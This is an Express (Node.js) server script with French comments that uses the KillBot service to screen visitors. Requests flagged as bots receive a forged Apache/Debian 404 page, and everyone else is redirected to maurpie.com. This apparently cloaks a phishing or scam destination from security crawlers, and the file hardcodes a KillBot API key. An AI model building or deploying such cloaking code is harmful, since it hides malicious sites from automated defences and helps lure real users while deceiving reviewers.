import express from 'express';
import KillBot from 'killbot.to';

// Votre clé API killbot.to
const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

/**
 * Fonction de gestion KillBot (inspirée de ton code)
 */
async function handler(req, res) {
  try {
    // Vérifier la requête via KillBot
    const result = await killBot.checkReq(req);

    if (result.block) {
      // Si KillBot considère que c'est un bot => faux 404
      const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>404 Not Found</title></head>
<body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.57 (Debian) Server Port 80</address>
</body></html>`;
      return res.status(404).send(fake404);
    } else {
      // Sinon, on redirige vers https://maurpie.com
      res.writeHead(302, { Location: 'https://maurpie.com' });
      return res.end();
    }
  } catch (err) {
    console.error('KillBot error:', err);
    // En cas d'erreur (IP invalide, etc.), renvoie un code 500
    return res.status(500).send('Internal Server Error');
  }
}

// --- Configuration du serveur Express ---

const app = express();
const PORT = process.env.PORT || 3000;

// Route GET sur "/"
app.get('/', (req, res) => {
  // On appelle la fonction handler KillBot
  handler(req, res);
});

// Pour toute autre URL => 404 standard
app.all('*', (req, res) => {
  res.status(404).send('Not Found');
});

// On démarre le serveur
app.listen(PORT, () => {
  console.log(`Serveur démarré sur le port ${PORT}`);
});